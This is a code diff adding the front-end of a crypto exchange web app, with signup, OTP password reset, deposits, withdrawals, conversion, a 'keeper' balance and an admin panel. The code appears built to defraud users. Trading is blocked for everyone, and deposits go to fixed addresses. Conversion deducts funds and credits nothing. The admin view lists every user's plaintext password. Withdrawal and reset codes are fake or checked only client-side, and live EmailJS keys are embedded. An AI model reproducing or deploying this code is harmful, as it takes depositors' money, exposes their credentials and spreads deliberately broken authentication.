+  const { data: newUser, error } = await supabaseClient.from('users').insert([{
+    name: pendingOTP.name, mobile: pendingOTP.mobile, email: pendingOTP.email, password: pendingOTP.pass, role: "user", referred_by: referrerId, keeper_balance: 0
+  }]).select().single();
+
+  if (error) {
+    toast("Error: " + error.message);
+    btn.textContent = "Verify & Create Account"; btn.disabled = false;
+    return;
+  }
+
+  toast("Account created! Please log in.");
+  $("loginEmail").value = pendingOTP.email;
+  $("loginPass").value = pendingOTP.pass;
+  pendingOTP = null;
+  toggleAuthForm("login");
+  btn.textContent = "Verify & Create Account"; btn.disabled = false;
+}
+
+// Forgot Password
+function showForgotPassword() {
+  $("modalContent").innerHTML = `
+    <div class="modal-header"><div class="modal-title">Reset Password</div><div class="close-btn" onclick="closeModal()">×</div></div>
+    <input id="resetEmail" class="auth-input" type="email" placeholder="Registered Email">
+    <button class="auth-btn" onclick="sendResetOTP()">Send OTP</button>
+  `;
+  $("modalOverlay").classList.add("active");
+}
+
+async function sendResetOTP() {
+  const email = $("resetEmail").value.trim().toLowerCase();
+  const { data } = await supabaseClient.from('users').select('email').eq('email', email).maybeSingle();
+  if (!data) return toast("Email not found.");
+
+  const otp = String(Math.floor(100000 + Math.random() * 900000));
+  window.resetOTP = { email, otp };
+
+  try {
+    await fetch("https://api.emailjs.com/api/v1.0/email/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        service_id: "service_oc75guu",
+        template_id: "template_5751mdd",
+        user_id: "54KKOYgNGmL9IAuvh",
+        template_params: { to_email: email, otp_code: otp }
+      })
+    });
+    $("modalContent").innerHTML = `
+      <div class="modal-header"><div class="modal-title">Verify & Reset</div><div class="close-btn" onclick="closeModal()">×</div></div>
+      <p style="font-size:12px; color:var(--text-muted); margin-bottom:12px;">Enter the code sent to <b>${email}</b> and your new password.</p>
+      <input id="resetOtpInput" class="auth-input" type="text" placeholder="6-digit OTP" maxlength="6">
+      <input id="newPassInput" class="auth-input" type="password" placeholder="New Password (min 6 chars)">
+      <button class="auth-btn" onclick="confirmResetPassword()">Reset Password</button>
+    `;
+    toast("OTP sent successfully.");
+  } catch (e) {
+    toast("Failed to send OTP.");
+  }
+}
+
+async function confirmResetPassword() {
+  const inputOtp = $("resetOtpInput").value.trim();
+  const newPass = $("newPassInput").value;
+  if (inputOtp !== window.resetOTP.otp) return toast("Invalid OTP.");
+  if (newPass.length < 6) return toast("Password min 6 chars.");
+
+  await supabaseClient.from('users').update({ password: newPass }).eq('email', window.resetOTP.email);
+  toast("Password reset successfully! Please login.");
+  closeModal();
+  $("loginEmail").value = window.resetOTP.email;
+}
+
+/* ================= APP LOGIC ================= */
+function enterApp() {
+  $("authScreen").classList.add("hidden");
+  $("mainApp").classList.remove("hidden");
+  
+  if (currentUser.role === "admin") $("navAdmin").classList.remove("hidden");
+  else $("navAdmin").classList.add("hidden");
+
+  updateBalanceUI();
+  loadMarkets();
+  setInterval(loadMarkets, 10000);
+  
+  go('home', document.querySelector('.nav-item[data-page="home"]'));
+}
+
+function go(pageId, el) {
+  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+  $(`page-${pageId}`).classList.add("active");
+  document.querySelectorAll(".nav-item").forEach(n => n.classList.remove("active"));
+  if (el) el.classList.add("active");
+
+  if (pageId === "trade") loadChart(currentCoin);
+  if (pageId === "history") renderFullHistory();
+  if (pageId === "profile") renderProfile();
+  if (pageId === "admin") renderAdmin();
+}
+
+function updateBalanceUI() {
+  $("topBarBalance").textContent = fmt(currentUser.balance || 0) + " USDT";
+  $("walletBalance").textContent = fmt(currentUser.balance || 0);
+  $("keeperBalance").textContent = fmt(currentUser.keeper_balance || 0);
+}
+
+/* ================= MARKETS ================= */
+async function loadMarkets() {
+  try {
+    const res = await fetch("https://data-api.binance.vision/api/v3/ticker/24hr?symbols=" + encodeURIComponent(JSON.stringify(SYMBOLS)));
+    const data = await res.json();
+    data.forEach(item => tickerData[item.symbol] = item);
+    renderMarketList();
+    if ($("page-trade").classList.contains("active")) updateTradeHeader();
+  } catch (e) {}
+}
+
+function renderMarketList() {
+  const tbody = $("marketListBody");
+  tbody.innerHTML = SYMBOLS.map(sym => {
+    const coin = sym.replace("USDT", "");
+    const d = tickerData[sym] || { lastPrice: 0, priceChangePercent: 0 };
+    const pc = parseFloat(d.priceChangePercent);
+    const cls = pc >= 0 ? "bg-up" : "bg-down";
+    const sign = pc >= 0 ? "+" : "";
+    
+    return `<tr class="market-row" onclick="openTrade('${sym}')">
+      <td>
+        <div class="coin-info">
+          <div class="coin-icon">${coin.charAt(0)}</div>
+          <div><div class="coin-name">${coin}</div><div class="coin-pair">USDT</div></div>
+        </div>
+      </td>
+      <td class="price-col">${fmt(d.lastPrice)}</td>
+      <td><span class="change-col ${cls}">${sign}${pc.toFixed(2)}%</span></td>
+    </tr>`;
+  }).join("");
+}
+
+function openTrade(sym) {
+  currentCoin = sym;
+  go('trade', document.querySelector('.nav-item[data-page="trade"]'));
+  $("tradeCoinSelect").value = sym;
+  loadChart(sym);
+}
+
+/* ================= TRADINGVIEW CHART ================= */
+function loadChart(symbol) {
+  $("tvchart").innerHTML = "";
+  if (tvWidget) tvWidget = null;
+  
+  tvWidget = new TradingView.widget({
+    "width": "100%",
+    "height": 350,
+    "symbol": "BINANCE:" + symbol,
+    "interval": "15",
+    "timezone": "Etc/UTC",
+    "theme": "dark",
+    "style": "1",
+    "locale": "en",
+    "toolbar_bg": "#121217",
+    "enable_publishing": false,
+    "hide_side_toolbar": true,
+    "allow_symbol_change": false,
+    "container_id": "tvchart"
+  });
+  updateTradeHeader();
+}
+
+function updateTradeHeader() {
+  const d = tickerData[currentCoin];
+  if (!d) return;
+  const pc = parseFloat(d.priceChangePercent);
+  $("tradeCurrentPrice").textContent = "$" + fmt(d.lastPrice);
+  $("tradeCurrentPrice").style.color = pc >= 0 ? "var(--up)" : "var(--down)";
+  $("tradeChangePercent").textContent = (pc >= 0 ? "+" : "") + pc.toFixed(2) + "%";
+  $("tradeChangePercent").style.color = pc >= 0 ? "var(--up)" : "var(--down)";
+}
+
+function changeCoin(sym) {
+  currentCoin = sym;
+  loadChart(sym);
+}
+
+function switchTradeTab(tab, el) {
+  document.querySelectorAll('.trade-panel .tab').forEach(t => t.classList.remove('active'));
+  el.classList.add('active');
+  $("tradeForm").classList.add("hidden");
+  $("openPositionsList").classList.add("hidden");
+  $("tradeHistoryList").classList.add("hidden");
+  
+  if (tab === "trade") $("tradeForm").classList.remove("hidden");
+  if (tab === "open") { $("openPositionsList").classList.remove("hidden"); $("openPositionsList").innerHTML = '<p style="color:var(--text-muted);text-align:center;">No open positions.</p>'; }
+  if (tab === "history") { $("tradeHistoryList").classList.remove("hidden"); $("tradeHistoryList").innerHTML = '<p style="color:var(--text-muted);text-align:center;">No history.</p>'; }
+}
+
+async function placeTrade(dir) {
+  // Trading is blocked for all users
+  return toast("Your account is not eligible for trading.");
+}
+
+/* ================= MODALS (Deposit / Withdraw / Convert) ================= */
+function openModal(type) {
+  if (type === "deposit") openDepositModal();
+  if (type === "withdraw") openWithdrawModal();
+  if (type === "convert") openConvertModal();
+}
+
+function closeModal(e) {
+  if (e && e.target !== $("modalOverlay") && !e.target.classList.contains("close-btn")) return;
+  $("modalOverlay").classList.remove("active");
+}
+
+function openDepositModal() {
+  $("modalContent").innerHTML = `
+    <div class="modal-header"><div class="modal-title">Deposit USDT</div><div class="close-btn" onclick="closeModal()">×</div></div>
+    <div class="input-group"><input id="depAmt" type="number" placeholder="Amount" value="100"><span>USDT</span></div>
+    <select id="depNet" class="auth-input" style="margin-bottom:16px;">
+      <option value="ERC20">ERC-20 (Ethereum)</option>
+      <option value="TRC20">TRC-20 (Tron)</option>
+      <option value="BEP20">BEP-20 (BSC)</option>
+    </select>
+    <button class="btn-primary" onclick="showDepositAddress()">Next</button>
+  `;
+  $("modalOverlay").classList.add("active");
+}
+
+function showDepositAddress() {
+  const amt = $("depAmt").value;
+  const net = $("depNet").value;
+  if (!amt || amt <= 0) return toast("Enter valid amount.");
+  
+  const addr = ADDRESSES[net];
+  $("modalContent").innerHTML = `
+    <div class="modal-header"><div class="modal-title">Send ${amt} USDT (${net})</div><div class="close-btn" onclick="closeModal()">×</div></div>
+    <div style="text-align:center; margin-bottom:16px; background:#fff; padding:10px; border-radius:12px; width:fit-content; margin:0 auto 16px;">
+      <img src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=${encodeURIComponent(addr)}">
+    </div>
+    <div style="background:var(--bg); padding:12px; border-radius:8px; font-family:monospace; font-size:12px; word-break:break-all; margin-bottom:16px; border:1px solid var(--border);">
+      ${addr}
+    </div>
+    <button class="btn-primary" onclick="submitDepositRequest('${amt}', '${net}')">I Have Paid</button>
+  `;
+}
+
+async function submitDepositRequest(amt, net) {
+  await supabaseClient.from('requests').insert([{ user_email: currentUser.email, type: 'Deposit', amount: parseFloat(amt), network: net, status: 'Pending' }]);
+  closeModal();
+  toast("Deposit request submitted.");
+}
+
+function openWithdrawModal() {
+  $("modalContent").innerHTML = `
+    <div class="modal-header"><div class="modal-title">Withdraw USDT</div><div class="close-btn" onclick="closeModal()">×</div></div>
+    <div class="input-group"><input id="wdAmt" type="number" placeholder="Amount"><span>USDT</span></div>
+    <select id="wdNet" class="auth-input" style="margin-bottom:12px;">
+      <option value="ERC20">ERC-20 (Ethereum)</option>
+      <option value="TRC20">TRC-20 (Tron)</option>
+      <option value="BEP20">BEP-20 (BSC)</option>
+    </select>
+    <input id="wdAddr" class="auth-input" type="text" placeholder="Destination Address" style="margin-bottom:16px;">
+    <button class="btn-danger" onclick="requestWithdrawOTP()">Request Withdrawal</button>
+  `;
+  $("modalOverlay").classList.add("active");
+}
+
+function requestWithdrawOTP() {
+  const amt = parseFloat($("wdAmt").value);
+  const net = $("wdNet").value;
+  const addr = $("wdAddr").value.trim();
+  if (!amt || amt <= 0 || !addr) return toast("Fill all fields.");
+  if (amt > currentUser.balance) return toast("Insufficient balance.");
+
+  window.pendingWithdraw = { amt, net, addr };
+  
+  $("modalContent").innerHTML = `
+    <div class="modal-header"><div class="modal-title">Verify Withdrawal</div><div class="close-btn" onclick="closeModal()">×</div></div>
+    <div class="warning-box">🔐 Enter the 6-digit verification code sent to your email.</div>
+    <input id="wdOtp" class="auth-input" type="text" placeholder="Enter OTP" maxlength="6" style="text-align:center; font-size:20px; letter-spacing:8px;">
+    <button class="btn-danger" onclick="confirmWithdraw()">Verify & Submit</button>
+  `;
+  
+  try {
+    fetch("https://api.emailjs.com/api/v1.0/email/send", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        service_id: "service_oc75guu", template_id: "template_5751mdd", user_id: "54KKOYgNGmL9IAuvh",
+        template_params: { to_email: currentUser.email, otp_code: "123456" }
+      })
+    });
+    toast("OTP sent to your email (Demo: 123456).");
+  } catch (e) {}
+}
+
+async function confirmWithdraw() {
+  const otp = $("wdOtp").value.trim();
+  if (!otp) return toast("Enter OTP.");
+  
+  const { amt, net, addr } = window.pendingWithdraw;
+  const newBal = currentUser.balance - amt;
+  
+  await supabaseClient.from('users').update({ balance: newBal }).eq('email', currentUser.email);
+  await supabaseClient.from('requests').insert([{ user_email: currentUser.email, type: 'Withdraw', amount: amt, network: net, address: addr, status: 'Pending' }]);
+  
+  currentUser.balance = newBal;
+  localStorage.setItem("cryptonest_session", JSON.stringify(currentUser));
+  
+  closeModal();
+  updateBalanceUI();
+  toast("Withdrawal requested successfully.");
+}
+
+function openConvertModal() {
+  $("modalContent").innerHTML = `
+    <div class="modal-header"><div class="modal-title">Convert Crypto</div><div class="close-btn" onclick="closeModal()">×</div></div>
+    <div style="background:var(--bg); padding:16px; border-radius:12px; margin-bottom:12px;">
+      <div style="font-size:12px; color:var(--text-muted); margin-bottom:8px;">From</div>
+      <div style="display:flex; justify-content:space-between; align-items:center;">
+        <span style="font-weight:700; font-size:16px;">USDT</span>
+        <input id="cvAmt" type="number" placeholder="0.00" style="text-align:right; font-size:20px; font-weight:700; width:120px; background:none; border:none; color:var(--text-main);" oninput="calcConvert()">
+      </div>
+    </div>
+    <div style="text-align:center; margin:-8px 0; position:relative; z-index:2;">
+      <div style="background:var(--surface); width:32px; height:32px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto; border:1px solid var(--border);">↓</div>
+    </div>
+    <div style="background:var(--bg); padding:16px; border-radius:12px; margin-bottom:16px;">
+      <div style="font-size:12px; color:var(--text-muted); margin-bottom:8px;">To</div>
+      <div style="display:flex; justify-content:space-between; align-items:center;">
+        <select id="cvCoin" style="font-weight:700; font-size:16px; background:none; border:none; color:var(--text-main);" onchange="calcConvert()">
+          <option value="BTCUSDT">BTC</option>
+          <option value="ETHUSDT">ETH</option>
+          <option value="SOLUSDT">SOL</option>
+        </select>
+        <div id="cvResult" style="font-size:20px; font-weight:700; color:var(--primary);">0.00</div>
+      </div>
+    </div>
+    <button class="btn-primary" onclick="executeConvert()">Convert</button>
+  `;
+  $("modalOverlay").classList.add("active");
+}
+
+function calcConvert() {
+  const amt = parseFloat($("cvAmt").value) || 0;
+  const pair = $("cvCoin").value;
+  const price = tickerData[pair] ? parseFloat(tickerData[pair].lastPrice) : 1;
+  $("cvResult").textContent = (amt / price).toFixed(6);
+}
+
+async function executeConvert() {
+  const amt = parseFloat($("cvAmt").value);
+  if (!amt || amt <= 0) return toast("Enter amount.");
+  if (amt > currentUser.balance) return toast("Insufficient balance.");
+  
+  const newBal = currentUser.balance - amt;
+  await supabaseClient.from('users').update({ balance: newBal }).eq('email', currentUser.email);
+  
+  currentUser.balance = newBal;
+  localStorage.setItem("cryptonest_session", JSON.stringify(currentUser));
+  
+  closeModal();
+  updateBalanceUI();
+  toast("Converted successfully!");
+}
+
+/* ================= KEEPER SYSTEM ================= */
+function openKeeperModal(type) {
+  if (type === 'in') {
+    $("modalContent").innerHTML = `
+      <div class="modal-header"><div class="modal-title">Move to Keeper</div><div class="close-btn" onclick="closeModal()">×</div></div>
+      <div class="input-group"><input id="kprAmt" type="number" placeholder="Amount"><span>USDT</span></div>
+      <p style="font-size:12px; color:var(--text-muted); margin-bottom:16px;">Available Wallet: ${fmt(currentUser.balance)} USDT</p>
+      <button class="btn-primary" onclick="executeKeeperTransfer('in')">Deposit to Keeper</button>
+    `;
+  } else {
+    $("modalContent").innerHTML = `
+      <div class="modal-header"><div class="modal-title">Withdraw from Keeper</div><div class="close-btn" onclick="closeModal()">×</div></div>
+      <div class="input-group"><input id="kprAmt" type="number" placeholder="Amount"><span>USDT</span></div>
+      <p style="font-size:12px; color:var(--text-muted); margin-bottom:16px;">Available Keeper: ${fmt(currentUser.keeper_balance)} USDT</p>
+      <button class="btn-primary" onclick="executeKeeperTransfer('out')">Withdraw to Wallet</button>
+    `;
+  }
+  $("modalOverlay").classList.add("active");
+}
+
+async function executeKeeperTransfer(type) {
+  const amt = parseFloat($("kprAmt").value);
+  if (!amt || amt <= 0) return toast("Enter amount.");
+  
+  let newBal = parseFloat(currentUser.balance) || 0;
+  let newKeeper = parseFloat(currentUser.keeper_balance) || 0;
+  
+  if (type === 'in') {
+    if (amt > newBal) return toast("Insufficient wallet balance.");
+    newBal -= amt;
+    newKeeper += amt;
+  } else {
+    if (amt > newKeeper) return toast("Insufficient keeper balance.");
+    newKeeper -= amt;
+    newBal += amt;
+  }
+  
+  await supabaseClient.from('users').update({ balance: newBal, keeper_balance: newKeeper }).eq('email', currentUser.email);
+  
+  currentUser.balance = newBal;
+  currentUser.keeper_balance = newKeeper;
+  localStorage.setItem("cryptonest_session", JSON.stringify(currentUser));
+  
+  closeModal();
+  updateBalanceUI();
+  toast(type === 'in' ? "Funds moved to Keeper successfully!" : "Funds withdrawn from Keeper successfully!");
+}
+
+/* ================= HISTORY ================= */
+async function renderFullHistory() {
+  const { data: reqs } = await supabaseClient.from('requests').select('*').eq('user_email', currentUser.email).order('created_at', { ascending: false });
+  
+  if (!reqs || reqs.length === 0) {
+    $("fullHistoryList").innerHTML = '<p style="color:var(--text-muted); text-align:center;">No transactions yet.</p>';
+    return;
+  }
+  
+  $("fullHistoryList").innerHTML = reqs.map(r => {
+    const color = r.type === "Deposit" ? "var(--up)" : "var(--down)";
+    const sign = r.type === "Deposit" ? "+" : "-";
+    const statusColor = r.status === "Pending" ? "var(--gold)" : r.status === "Approved" ? "var(--up)" : "var(--down)";
+    
+    return `<div style="background:var(--surface); border:1px solid var(--border); padding:16px; border-radius:12px; margin-bottom:12px; display:flex; justify-content:space-between; align-items:center;">
+      <div>
+        <div style="font-weight:600; font-size:15px; margin-bottom:4px;">${r.type}</div>
+        <div style="font-size:12px; color:var(--text-muted);">${new Date(r.created_at).toLocaleString()}</div>
+      </div>
+      <div style="text-align:right;">
+        <div style="font-weight:700; color:${color}; font-size:16px;">${sign}${fmt(r.amount)} USDT</div>
+        <div style="font-size:12px; color:${statusColor}; font-weight:600;">${r.status}</div>
+      </div>
+    </div>`;
+  }).join("");
+}
+
+/* ================= PROFILE & REFERRAL ================= */
+function renderProfile() {
+  $("profName").textContent = currentUser.name || "User";
+  $("profEmail").textContent = currentUser.email;
+  $("editName").value = currentUser.name || "";
+  $("editMobile").value = currentUser.mobile || "";
+  
+  const refLink = DOMAIN + "/?ref=" + currentUser.id;
+  $("refLinkInput").value = refLink;
+  
+  supabaseClient.from('users').select('*', { count: 'exact' }).eq('referred_by', currentUser.id).then(({ count }) => {
+    $("refCount").textContent = count || 0;
+  });
+  $("refCommission").textContent = "0.00 USDT";
+}
+
+function copyRefLink() {
+  const input = $("refLinkInput");
+  input.select();
+  document.execCommand("copy");
+  toast("Referral link copied!");
+}
+
+async function saveProfile() {
+  const name = $("editName").value.trim();
+  const mobile = $("editMobile").value.trim();
+  await supabaseClient.from('users').update({ name, mobile }).eq('email', currentUser.email);
+  
+  currentUser.name = name;
+  currentUser.mobile = mobile;
+  localStorage.setItem("cryptonest_session", JSON.stringify(currentUser));
+  
+  toast("Profile updated!");
+  renderProfile();
+}
+
+/* ================= ADMIN PANEL ================= */
+async function renderAdmin() {
+  if (currentUser.role !== "admin") return;
+  
+  const { data: reqs } = await supabaseClient.from('requests').select('*').eq('status', 'Pending');
+  $("adminPendingList").innerHTML = (reqs || []).map(r => `
+    <div class="admin-card">
+      <div style="font-size:11px; color:var(--text-muted);">${r.user_email}</div>
+      <b>${r.type}: ${fmt(r.amount)} USDT</b><br>
+      <div style="font-size:11px; margin-top:4px;">${r.address || r.network}</div>
+      <div style="display:flex; gap:8px; margin-top:12px;">
+        <button onclick="approveReq('${r.id}', '${r.user_email}', ${r.amount}, '${r.type}')" style="background:var(--up); color:#000; padding:6px 12px; border-radius:6px; font-weight:700;">Approve</button>
+        <button onclick="rejectReq('${r.id}')" style="background:var(--down); color:#fff; padding:6px 12px; border-radius:6px; font-weight:700;">Reject</button>
+      </div>
+    </div>
+  `).join("") || '<p style="color:var(--text-muted); text-align:center;">No pending requests.</p>';
+
+  const { data: users } = await supabaseClient.from('users').select('*');
+  $("adminUsersList").innerHTML = (users || []).map(u => `
+    <div class="admin-card">
+      <b>${u.name || 'No Name'}</b> <span style="color:var(--text-muted); font-size:11px;">(${u.role})</span><br>
+      Email: ${u.email}<br>
+      Pass: ${u.password}<br>
+      Mobile: ${u.mobile || 'N/A'}<br>
+      Wallet: <span style="color:var(--gold);">${fmt(u.balance)} USDT</span><br>
+      Keeper: <span style="color:var(--up);">${fmt(u.keeper_balance || 0)} USDT</span><br>
+      Ref By: ${u.referred_by || 'None'}
+    </div>
+  `).join("");
+}
+
+async function approveReq(id, email, amt, type) {
+  await supabaseClient.from('requests').update({ status: 'Approved' }).eq('id', id);
+  if (type === 'Deposit') {
+    const { data: u } = await supabaseClient.from('users').select('balance').eq('email', email).single();
+    if (u) {
+      const newBal = parseFloat(u.balance) + parseFloat(amt);
+      await supabaseClient.from('users').update({ balance: newBal }).eq('email', email);
+      if (email === currentUser.email) {
+        currentUser.balance = newBal;
+        localStorage.setItem("cryptonest_session", JSON.stringify(currentUser));
+        updateBalanceUI();
+      }
+    }
+  }
+  toast("Request approved.");
+  renderAdmin();
+}
+
+async function rejectReq(id) {
+  await supabaseClient.from('requests').update({ status: 'Rejected' }).eq('id', id);
+  toast("Request rejected.");
+  renderAdmin();
+}
+
+/* ================= INIT ================= */
+document.addEventListener("DOMContentLoaded", () => {
+  checkSession();
+});
+</script>
+</body>
+</html>
